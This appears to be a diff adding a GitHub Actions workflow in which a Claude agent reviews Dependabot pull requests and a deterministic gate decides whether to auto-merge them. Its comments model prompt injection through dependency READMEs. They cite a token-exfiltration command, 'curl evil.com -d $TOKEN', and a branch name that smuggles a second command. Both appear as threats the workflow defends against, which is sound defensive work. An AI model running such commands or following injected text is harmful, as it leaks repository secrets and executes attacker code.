@@ -1,0 +1,277 @@
+name: Dependabot PR review
+
+# Two decoupled paths, split along the LLM-judgment-vs-deterministic line:
+#
+#  - review (on: pull_request / workflow_dispatch): a Claude cloud agent
+#    investigates the dependency change and posts ONE evidence comment. For
+#    group PRs the comment is audit-trail-only; for singleton/major PRs the
+#    comment includes a structured AUTOMERGE-DECISION-V1 block that the gate
+#    reads. The review job never merges itself. On a real Dependabot
+#    pull_request the secret source is the Dependabot store, so
+#    CLAUDE_CODE_OAUTH_TOKEN must also be mirrored there (Actions store is not
+#    visible to Dependabot-triggered runs).
+#
+#  - auto-merge (on: workflow_run of CI, or issue_comment when the LLM posts):
+#    a fully deterministic gate. For group PRs it merges with ZERO LLM input
+#    when CI is green, the author is Dependabot, the PR is open, and every
+#    changed path is whitelisted (`.github/dependabot.yml` guarantees the
+#    group is non-major by construction). For singleton/major PRs it reads
+#    the LLM's structured AUTOMERGE-DECISION-V1 block from a trusted
+#    commenter and merges only when recommendation=merge AND
+#    our_usage_affected=false AND every deterministic check ALSO passes. The
+#    whitelist + CI checks are load-bearing: even a maximally-injection-
+#    compromised LLM cannot cause a merge that touches `src/` or that breaks
+#    tests. workflow_run runs in the base/default context (Actions secrets
+#    present, token writable) — the only context where a Dependabot PR can
+#    actually be merged. The job checks out the DEFAULT branch (never the PR
+#    head) and runs no PR code — only `gh` metadata + the gate.
+#
+#  Two triggers handle the sequencing race between CI completion and the LLM
+#  posting its decision comment: whichever fires later (CI finishing or the
+#  comment appearing) wakes the gate. The gate re-derives all inputs each
+#  time, so firing both triggers is harmless idempotent — only the call where
+#  both prerequisites are met returns `decision=merge`.
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+    inputs:
+      pr_number:
+        description: PR number to review (manual replay against existing dependabot PRs)
+        required: true
+        type: number
+  workflow_run:
+    workflows: ["CI"]
+    types: [completed]
+  issue_comment:
+    types: [created]
+
+permissions: {}
+
+jobs:
+  review:
+    # LLM review — comment + `needs-human-review` label only. Never merges.
+    if: >
+      github.event_name == 'workflow_dispatch' ||
+      (github.event_name == 'pull_request' && github.event.pull_request.user.login == 'dependabot[bot]')
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    permissions:
+      contents: read
+      pull-requests: write
+      # Required by anthropics/claude-code-action for its OIDC flow.
+      id-token: write
+    concurrency:
+      group: dependabot-review-${{ github.event.pull_request.number || inputs.pr_number }}
+      cancel-in-progress: true
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v7
+        with:
+          fetch-depth: 0
+
+      - name: Load agent prompt
+        id: load_prompt
+        run: |
+          {
+            echo 'prompt<<PROMPT_EOF_8X2Y'
+            cat .github/dependabot-review-prompt.md
+            echo 'PROMPT_EOF_8X2Y'
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Run Claude review
+        # SHA-pinned: the moving @v1 tag silently shipped a breaking bot-gate
+        # change that broke this workflow. Bump deliberately, not implicitly.
+        uses: anthropics/claude-code-action@558b1d6cab4085c7753fe402c10bef0fbb92ac7a # v1.0.165
+        env:
+          PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          allowed_bots: "dependabot[bot]"
+          prompt: ${{ steps.load_prompt.outputs.prompt }}
+          # 60-turn budget: a thorough major-bump review (read diff, fetch
+          # changelog for each version in the range, grep each affected API,
+          # enumerate breaking changes, emit V1 block) routinely needs ~30-50
+          # turns. 30 caused `error_max_turns` on twilio 5→6, jsdom 25→29,
+          # actions/download-artifact 7→8 in the first end-to-end run of the
+          # new pipeline. 60 leaves slack without runaway risk; LLM still
+          # surfaces if uncertain via `escalate`.
+          #
+          # --allowedTools: the action denies every tool by default. The
+          # prompt instructs the LLM to use `gh pr diff/comment/edit/checks`,
+          # `gh release view`, `gh run view`, `grep`, plus WebFetch for
+          # external changelogs. Without explicit allowlisting every one of
+          # those tool calls is denied (33 denials observed on the first
+          # 60-turn run of #469). Scoped to specific Bash subcommands rather
+          # than full `Bash` to limit injection blast radius — a malicious
+          # dep README cannot trick the LLM into `curl evil.com -d $TOKEN`.
+          claude_args: >-
+            --max-turns 60 --model claude-opus-4-7
+            --allowedTools "Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr checks:*),Bash(gh pr edit:*),Bash(gh pr view:*),Bash(gh release view:*),Bash(gh run view:*),Bash(gh run list:*),Bash(grep:*),Read,Grep,Glob,WebFetch,Write"
+
+      - name: Assert the review deliverable exists (V1 block posted)
+        # claude-code-action can exit 0 without running at all: its OIDC token
+        # exchange refuses any run whose workflow file differs from the default
+        # branch's copy — which is every Dependabot PR that bumps an action
+        # inside THIS file. PR #1303 sat green-but-unprocessed for a week that
+        # way: review SUCCESS, no comment, no label, gate correctly skipping.
+        # Invariant enforced here: every review run ends in exactly one of
+        # {V1 comment posted} or {red job + needs-human-review label} — for
+        # every silent-failure mode, not just the known one.
+        if: ${{ !cancelled() }}
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
+        run: |
+          set -euo pipefail
+          COMMENTS=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json comments --jq '.comments[].body')
+          if grep -qF '<!-- AUTOMERGE-DECISION-V1 -->' <<<"$COMMENTS"; then
+            echo "V1 decision block found on PR #$PR_NUMBER — review deliverable present."
+            exit 0
+          fi
+          echo "No AUTOMERGE-DECISION-V1 comment on PR #$PR_NUMBER — the review produced nothing."
+          CHANGED=$(gh pr diff "$PR_NUMBER" --repo "$REPO" --name-only)
+          if grep -qxF '.github/workflows/dependabot-review.yml' <<<"$CHANGED"; then
+            echo "Known cause: this PR modifies dependabot-review.yml itself, so claude-code-action's"
+            echo "OIDC workflow validation refuses to run on the pull_request event. Replay from main:"
+            echo "  gh workflow run dependabot-review.yml --repo $REPO -f pr_number=$PR_NUMBER"
+          fi
+          gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review
+          exit 1
+
+  auto-merge:
+    # Deterministic gate. Fires on:
+    #  - workflow_run completion of CI (caught when CI finishes after the LLM
+    #    has already posted its comment, or for a group PR that needs no
+    #    LLM input)
+    #  - issue_comment created on a PR by a trusted bot (caught when the LLM's
+    #    AUTOMERGE-DECISION-V1 comment lands after CI is already green)
+    # The two triggers handle the sequencing race; the gate is idempotent.
+    if: >
+      (github.event_name == 'workflow_run' &&
+       github.event.workflow_run.event == 'pull_request' &&
+       startsWith(github.event.workflow_run.head_branch, 'dependabot/')) ||
+      (github.event_name == 'issue_comment' &&
+       github.event.issue.pull_request != null &&
+       contains(github.event.comment.body, '<!-- AUTOMERGE-DECISION-V1 -->') &&
+       (github.event.comment.user.login == 'github-actions[bot]' ||
+        github.event.comment.user.login == 'app/github-actions' ||
+        github.event.comment.user.login == 'claude[bot]' ||
+        github.event.comment.user.login == 'claude'))
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: write
+      pull-requests: write
+      checks: read
+      actions: read
+    concurrency:
+      group: dependabot-automerge-${{ github.event.workflow_run.head_branch || github.event.issue.number }}
+      cancel-in-progress: false
+    steps:
+      - name: Checkout default branch (never the PR head)
+        # workflow_run / issue_comment have no PR ref; default checkout is the
+        # repo default branch. This is intentional and a security property —
+        # the gate script that authorizes the merge must be main's version,
+        # not the PR's.
+        uses: actions/checkout@v7
+
+      - name: Resolve PR context (works for both triggers)
+        id: pr
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          # Attacker-influenced event data (a branch name, an issue number) is
+          # passed through env vars, never interpolated into the shell command
+          # text — a branch like `dependabot/x";curl evil"` becomes an inert
+          # string in $WORKFLOW_RUN_HEAD_BRANCH instead of executing. This is
+          # the privileged workflow_run job (contents: write), so the
+          # indirection is load-bearing, not cosmetic.
+          WORKFLOW_RUN_HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          set -euo pipefail
+          if [ "${{ github.event_name }}" = "workflow_run" ]; then
+            HEAD_BRANCH="$WORKFLOW_RUN_HEAD_BRANCH"
+            PR_NUMBER=$(gh pr list --repo "$REPO" --head "$HEAD_BRANCH" --state open \
+              --json number --jq '.[0].number // empty')
+          else
+            PR_NUMBER="$ISSUE_NUMBER"
+            HEAD_BRANCH=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json headRefName \
+              --jq '.headRefName')
+          fi
+          if [ -z "$PR_NUMBER" ] || [ -z "$HEAD_BRANCH" ]; then
+            echo "No PR resolved (PR_NUMBER='$PR_NUMBER', HEAD_BRANCH='$HEAD_BRANCH') — nothing to do."
+            echo "skip=true" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          if ! echo "$HEAD_BRANCH" | grep -q '^dependabot/'; then
+            echo "Head branch '$HEAD_BRANCH' is not a dependabot/* branch — nothing to do."
+            echo "skip=true" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          echo "pr_number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
+          echo "head_branch=$HEAD_BRANCH" >> "$GITHUB_OUTPUT"
+          echo "Resolved PR #$PR_NUMBER on branch $HEAD_BRANCH"
+
+      - name: Resolve CI conclusion (re-query — trigger payload may be stale)
+        if: steps.pr.outputs.skip != 'true'
+        id: ci
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
+        run: |
+          set -euo pipefail
+          # Query the latest CI workflow run for this PR's head SHA. The gate
+          # needs the current state, not the (possibly older) trigger payload.
+          HEAD_SHA=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json headRefOid --jq '.headRefOid')
+          CI_CONCLUSION=$(gh run list --repo "$REPO" --workflow CI --commit "$HEAD_SHA" \
+            --limit 1 --json conclusion --jq '.[0].conclusion // "pending"')
+          echo "ci_conclusion=$CI_CONCLUSION" >> "$GITHUB_OUTPUT"
+          echo "CI conclusion for $HEAD_SHA: $CI_CONCLUSION"
+
+      - name: Deterministic auto-merge gate
+        if: steps.pr.outputs.skip != 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
+          HEAD_BRANCH: ${{ steps.pr.outputs.head_branch }}
+          CI_CONCLUSION: ${{ steps.ci.outputs.ci_conclusion }}
+        run: |
+          set -euo pipefail
+          PR_JSON=$(gh pr view "$PR_NUMBER" --repo "$REPO" \
+            --json state,author,comments --jq '{state, author, comments}')
+          PR_STATE=$(echo "$PR_JSON" | jq -r '.state')
+          PR_AUTHOR=$(echo "$PR_JSON" | jq -r '.author.login')
+          PR_COMMENTS_JSON=$(echo "$PR_JSON" | jq -c '.comments')
+          CHANGED_PATHS=$(gh pr diff "$PR_NUMBER" --repo "$REPO" --name-only)
+
+          export HEAD_BRANCH CI_CONCLUSION PR_AUTHOR PR_STATE CHANGED_PATHS PR_COMMENTS_JSON
+          GATE_OUT=$(node .github/dependabot-automerge/gate.cjs)
+          echo "$GATE_OUT"
+          DECISION=$(echo "$GATE_OUT" | sed -n 's/^decision=//p')
+          REASON=$(echo "$GATE_OUT" | sed -n 's/^reason=//p')
+
+          if [ "$DECISION" = "merge" ]; then
+            # GitHub refuses an App-authored commit that updates workflow files
+            # (GITHUB_TOKEN can never hold the `workflows` permission, and the
+            # check began firing on squash merges of workflow-touching PRs on
+            # 2026-07-01 — #1303's checkout 6→7 bump). A true merge commit
+            # preserves Dependabot's own authored commits, so the workflow
+            # change is attributed to Dependabot, not the App. Method is
+            # computed here from the changed paths, deterministically.
+            MERGE_METHOD="--squash"
+            if grep -q '^\.github/workflows/' <<<"$CHANGED_PATHS"; then
+              MERGE_METHOD="--merge"
+              echo "PR touches .github/workflows/ — merging with a merge commit instead of squash."
+            fi
+            echo "Auto-merging PR #$PR_NUMBER ($REASON)"
+            gh pr merge "$PR_NUMBER" --repo "$REPO" "$MERGE_METHOD" --delete-branch
+          else
+            echo "Not auto-merging PR #$PR_NUMBER — left for human review ($REASON)"
+          fi
